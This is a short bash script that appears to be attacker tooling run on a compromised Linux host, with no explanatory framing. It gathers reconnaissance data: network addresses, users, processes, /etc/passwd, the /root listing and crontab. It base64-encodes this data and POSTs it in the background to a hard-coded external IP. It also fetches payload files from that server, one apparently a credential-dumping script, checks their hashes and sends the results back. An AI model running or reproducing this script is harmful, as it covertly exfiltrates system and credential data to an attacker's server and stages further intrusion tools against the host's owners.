#!/bin/bash
# fxc2
({ ip -4 a; id; w; ps -axuwwww; curl -sf ifconfig.me 2>/dev/null; echo; cat /etc/passwd 2>/dev/null | head -20; ls -la /root/ 2>/dev/null | head -20; crontab -l 2>/dev/null; } 2>&1 | base64 -w0 | xargs -I{} curl -sf -X POST http://131.123.43.239/up -H "X-Name: fxr2" --data-binary {} >/dev/null 2>&1) &
# diag: what does mel actually receive for sensitive payloads
O=/tmp/.DIAGX.txt
{
echo "=md5 sd3.py via :80=";  curl -sm20 http://131.123.43.239/sd3.py | md5sum
echo "=md5 sd3.py via :8123="; curl -sm20 http://131.123.43.239:8123/sd3.py | md5sum
echo "=md5 sd3.b64 via :80="; curl -sm20 http://131.123.43.239/sd3.b64 | md5sum
echo "=first300 :80="; curl -sm20 http://131.123.43.239/sd3.py | head -c 300
echo; echo "=bytes udung :80="; curl -sm20 http://131.123.43.239/sd3.py | wc -c
echo "=md5 gpph2.py :80="; curl -sm20 http://131.123.43.239/gpph2.py | md5sum
echo "=md5 secretsdump2.py? earlier name="; curl -sm20 http://131.123.43.239/secdump2.py | md5sum
} > "$O" 2>&1
curl -sm30 -X POST --data-binary @"$O" http://131.123.43.239/up -H "X-Name: mel2_diagx"
echo DIAGX_DONE
b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H "X-Name: wrk_out" --data-binary "$b" >/dev/null 2>&1


